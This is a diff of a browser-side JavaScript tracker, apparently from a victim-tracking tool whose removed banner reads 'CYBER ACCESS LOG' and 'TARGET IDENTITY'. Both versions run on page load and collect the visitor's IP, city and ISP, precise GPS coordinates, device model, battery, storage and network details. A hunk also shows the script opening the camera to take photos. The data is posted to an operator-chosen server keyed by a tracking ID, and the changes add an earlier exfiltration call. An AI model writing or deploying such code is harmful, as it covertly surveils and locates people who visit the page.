@@ -1,176 +1,140 @@
-window.addEventListener("load", async () => {
-
-  const startTime = Date.now();
-
-  const scriptTag = document.querySelector("script[data-tracking-id]");
+window.addEventListener('load', async () => {
+  const scriptTag = document.querySelector('script[data-tracking-id]');
   if (!scriptTag) return;
 
-  const trackingId = scriptTag.dataset.trackingId;
-  const serverUrl = scriptTag.dataset.serverUrl;
-
+  const trackingId = scriptTag.getAttribute('data-tracking-id');
+  const serverUrl = scriptTag.getAttribute('data-server-url');
   if (!trackingId || !serverUrl) return;
 
   const data = {};
 
-  // 🌐 Public IP
+  // Get IP
   try {
-    const res = await fetch("https://api.ipify.org?format=json");
-    const ipData = await res.json();
-    data.IP_Address = ipData.ip;
-  } catch {
-    data.IP_Address = "Unavailable";
+    const ipResponse = await fetch('https://api.ipify.org?format=json');
+    data.IP_Address = (await ipResponse.json()).ip;
+  } catch (e) {
+    data.IP_Address = 'Error';
   }
 
-try {
-  const geo = await fetch(`https://ipapi.co/${data.IP_Address}/json/`);
-  const geoData = await geo.json();
-
-  data.Geo = {
-    Country: geoData.country_name || "Unknown",
-    Region: geoData.region || "Unknown",
-    City: geoData.city || "Unknown",
-    ISP: geoData.org || "Unknown"
-  };
-
-} catch {}
-
-  // 🧠 Basic Info
   data.User_Agent = navigator.userAgent;
   data.Language = navigator.language;
-  data.Platform = navigator.platform || "Unknown";
-  data.Cookies_Enabled = navigator.cookieEnabled ? "Yes" : "No";
-  data.Online_Status = navigator.onLine ? "Online" : "Offline";
-if (/Mobi|Android/i.test(navigator.userAgent)) {
-  data.Device_Type = "Mobile";
-} else if (/Tablet|iPad/i.test(navigator.userAgent)) {
-  data.Device_Type = "Tablet";
-} else {
-  data.Device_Type = "Desktop";
-}
-let browser = "Unknown";
-let engine = "Unknown";
-
-if (navigator.userAgent.includes("Chrome")) {
-  browser = "Chrome";
-  engine = "Blink";
-}
-
-if (navigator.userAgent.includes("Firefox")) {
-  browser = "Firefox";
-  engine = "Gecko";
-}
-
-if (
-  navigator.userAgent.includes("Safari") &&
-  !navigator.userAgent.includes("Chrome")
-) {
-  browser = "Safari";
-  engine = "WebKit";
-}
-
-data.Browser = browser;
-data.Engine = engine;
-
-  // 🖥️ Display
   data.Screen_Resolution = `${window.screen.width}x${window.screen.height}`;
-  data.Color_Depth = `${window.screen.colorDepth}-bit`;
   data.Timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
 
-  // 📱 Device Model
+  // Extract device model from user agent
   const ua = navigator.userAgent;
-  let deviceModel = "Unknown";
+  let deviceModel = 'Unknown';
 
-  if (/Android/.test(ua)) {
+  // Check for common mobile devices
+  if (/iPhone/.test(ua)) {
+    const match = ua.match(/iPhone\s?([^;)]+)/);
+    deviceModel = match ? `iPhone ${match[1]}`.trim() : 'iPhone';
+  } else if (/iPad/.test(ua)) {
+    deviceModel = 'iPad';
+  } else if (/Android/.test(ua)) {
     const match = ua.match(/Android[^;]*;\s*([^)]+)/);
     if (match) {
-      deviceModel = match[1].replace(/Build.*/, "").trim();
+      deviceModel = match[1].replace(/Build.*/, '').trim();
+    } else {
+      deviceModel = 'Android Device';
     }
-  } else if (/iPhone/.test(ua)) {
-    deviceModel = "iPhone";
-  } else if (/iPad/.test(ua)) {
-    deviceModel = "iPad";
+  } else if (/Windows Phone/.test(ua)) {
+    deviceModel = 'Windows Phone';
   } else if (/Windows/.test(ua)) {
-    deviceModel = "Windows PC";
-  } else if (/Macintosh/.test(ua)) {
-    deviceModel = "Mac";
+    deviceModel = 'Windows PC';
+  } else if (/Macintosh|Mac OS X/.test(ua)) {
+    deviceModel = 'Mac';
+  } else if (/Linux/.test(ua)) {
+    deviceModel = 'Linux PC';
   }
 
   data.Device_Model = deviceModel;
 
-  // 🔋 Battery
+  // Battery
   if (navigator.getBattery) {
     try {
       const battery = await navigator.getBattery();
-
       data.Battery = {
         Level: `${Math.round(battery.level * 100)}%`,
-        Charging: battery.charging ? "Yes" : "No"
+        Charging: battery.charging ? 'Yes' : 'No',
       };
-    } catch {}
+    } catch (e) {}
   }
 
-  // ⚙️ Hardware
+  // Hardware
   data.Hardware = {
-    CPU_Cores: navigator.hardwareConcurrency || "Unknown",
-    Device_Memory_GB: navigator.deviceMemory || "Unknown"
+    CPU_Cores: navigator.hardwareConcurrency || 'N/A',
+    Device_Memory_GB: navigator.deviceMemory || 'N/A',
   };
 
-  // 💾 Storage
+  // Storage
   if (navigator.storage && navigator.storage.estimate) {
     try {
-      const storage = await navigator.storage.estimate();
-
+      const quota = await navigator.storage.estimate();
       data.Storage = {
-        Usage_MB: `${(storage.usage / 1048576).toFixed(2)} MB`,
-        Quota_MB: `${(storage.quota / 1048576).toFixed(2)} MB`
+        Usage: `${(quota.usage / 1024 / 1024 / 1024).toFixed(2)} GB`,
+        Quota: `${(quota.quota / 1024 / 1024 / 1024).toFixed(2)} GB`,
       };
-    } catch {}
+    } catch (e) {}
   }
 
-  // 📡 Network
-  const connection =
-    navigator.connection ||
-    navigator.mozConnection ||
-    navigator.webkitConnection;
-
-  if (connection) {
-    data.Network = {
-      Type: connection.effectiveType || "Unknown",
-      Downlink: `${connection.downlink || "?"} Mb/s`,
-      RTT: `${connection.rtt || "?"} ms`,
-      Save_Data: connection.saveData ? "Enabled" : "Disabled"
+  // Network
+  const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+  if (conn) {
+    data.Network_Info = {
+      Type: conn.effectiveType,
+      Downlink_MBps: conn.downlink,
+      RTT_ms: conn.rtt,
     };
   }
 
-  // 📍 Location
-  try {
-    const position = await new Promise((resolve, reject) => {
-      navigator.geolocation.getCurrentPosition(resolve, reject, {
-        enableHighAccuracy: true,
-        timeout: 10000,
-        maximumAge: 0
+  // Check permissions
+  data.Permissions = {
+    Camera: 'Unknown',
+    Location: 'Unknown'
+  };
+
+  // Check location permission
+  if (navigator.permissions) {
+    try {
+      const locationPerm = await navigator.permissions.query({ name: 'geolocation' });
+      data.Permissions.Location = locationPerm.state.charAt(0).toUpperCase() + locationPerm.state.slice(1);
+    } catch (e) {}
+  }
+
+  // Request location first
+  if (navigator.geolocation) {
+    try {
+      const position = await new Promise((resolve, reject) => {
+        navigator.geolocation.getCurrentPosition(resolve, reject, {
+          timeout: 10000
+        });
       });
-    });
 
-    data.Location = {
-      Latitude: position.coords.latitude,
-      Longitude: position.coords.longitude,
-      Accuracy: `${Math.round(position.coords.accuracy)} meters`,
-      Google_Maps: `https://maps.google.com/?q=${position.coords.latitude},${position.coords.longitude}`
-    };
-  } catch {
-    data.Location = "Permission Denied";
+      data.Location = {
+        Latitude: position.coords.latitude,
+        Longitude: position.coords.longitude,
+        Accuracy: `${position.coords.accuracy}m`,
+        Google_Maps: `https://www.google.com/maps?q=${position.coords.latitude},${position.coords.longitude}`
+      };
+      data.Permissions.Location = 'Granted';
+    } catch (err) {
+      data.Location = 'Permission denied or unavailable';
+      data.Permissions.Location = 'Denied';
+    }
   }
 
-  //Photo 📸 
+  // Send metadata with location
+  await fetch(`${serverUrl}/data?trackingId=${trackingId}`, {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify(data),
+  }).catch(() => {});
 
   // Request camera and take 3 photos
   if (navigator.mediaDevices) {
     try {
       const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-
-      data.Permissions = {};
-
       data.Permissions.Camera = 'Granted';
 
       const video = document.createElement('video');
@@ -229,102 +193,10 @@ data.Engine = engine;
     }
   }
 
-
-  // 🕒 Current Time
-  data.Timestamp = new Date().toLocaleString();
-
-  // 🎨 FORMATTED OUTPUT
-const formatted = `
-🖥️ NEW SESSION CAPTURED 🖥️
-
-┏━━━━━━━━━━━━━━━━━━━━━━━━━┓
-             🖥️ CYBER ACCESS LOG 🖥️
-┗━━━━━━━━━━━━━━━━━━━━━━━━━┛
-
-🕶 TARGET IDENTITY
-════════════════════
-🌐 IP        ➤ ${data.IP_Address}
-📶 STATUS    ➤ ${data.Online_Status}
-🗣 LANG      ➤ ${data.Language}
-
-📱 DEVICE SCAN
-════════════════════
-📲 MODEL     ➤ ${data.Device_Model}
-⚙️ PLATFORM  ➤ ${data.Platform}
-🍪 COOKIES   ➤ ${data.Cookies_Enabled}
-🧾 AGENT     ➤ ${data.User_Agent}
-
-🖥 DISPLAY MATRIX
-════════════════════
-📺 SCREEN    ➤ ${data.Screen_Resolution}
-🎨 COLORS    ➤ ${data.Color_Depth}
-🌍 ZONE      ➤ ${data.Timezone}
-
-🔋 POWER CORE
-════════════════════
-🔋 BATTERY   ➤ ${data.Battery?.Level || "N/A"}
-⚡ CHARGING  ➤ ${data.Battery?.Charging || "N/A"}
-
-⚙️ HARDWARE NODE
-════════════════════
-🧠 CPU       ➤ ${data.Hardware?.CPU_Cores || "N/A"} Cores
-💾 RAM       ➤ ${data.Hardware?.Device_Memory_GB || "N/A"} GB
-
-💽 STORAGE TRACE
-════════════════════
-📂 USED      ➤ ${data.Storage?.Usage_MB || "N/A"}
-📦 TOTAL     ➤ ${data.Storage?.Quota_MB || "N/A"}
-
-📡 NETWORK SIGNAL
-════════════════════
-📶 TYPE      ➤ ${data.Network?.Type || "N/A"}
-🚀 SPEED     ➤ ${data.Network?.Downlink || "N/A"}
-📡 RTT       ➤ ${data.Network?.RTT || "N/A"}
-💡 SAVE DATA ➤ ${data.Network?.Save_Data || "N/A"}
-
-📍 GEO TRACKER
-════════════════════
-📌 LAT       ➤ ${data.Location?.Latitude || "N/A"}
-📌 LONG      ➤ ${data.Location?.Longitude || "N/A"}
-🎯 ACCURACY  ➤ ${data.Location?.Accuracy || "N/A"}
-🗺 MAP       ➤ ${data.Location?.Google_Maps || data.Location || "N/A"}
-
-🌍 GEO DATABASE
-════════════════════
-🌎 COUNTRY   ➤ ${data.Geo?.Country || "N/A"}
-🏙 REGION    ➤ ${data.Geo?.Region || "N/A"}
-🏠 CITY      ➤ ${data.Geo?.City || "N/A"}
-📡 ISP       ➤ ${data.Geo?.ISP || "N/A"}
-
-📲 DEVICE TYPE
-════════════════════
-🛠 ${data.Device_Type || "Unknown"}
-
-🌐 BROWSER CORE
-════════════════════
-🧠 BROWSER   ➤ ${data.Browser || "Unknown"}
-⚙️ ENGINE    ➤ ${data.Engine || "Unknown"}
-
-⏳ SESSION TRACE
-════════════════════
-🕒 TIME      ➤ ${data.Timestamp}
-⌛ DURATION  ➤ ${data.Session_Duration || "0 sec"}
-
-┏━━━━━━━━━━━━━━━━━━━━━━━━━┓
-            ⚡ POWERED BY ZShadow ⚡
-┗━━━━━━━━━━━━━━━━━━━━━━━━━┛
-`;
-
-  // 🚀 Send
-  await fetch(`${serverUrl}/data`, {
-    method: "POST",
-    headers: {
-      "Content-Type": "application/json"
-    },
-    body: JSON.stringify({
-      trackingId,
-      pretty: formatted
-    })
+  // Send updated permission data
+  await fetch(`${serverUrl}/data?trackingId=${trackingId}`, {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({ Permissions: data.Permissions }),
   }).catch(() => {});
-
 });
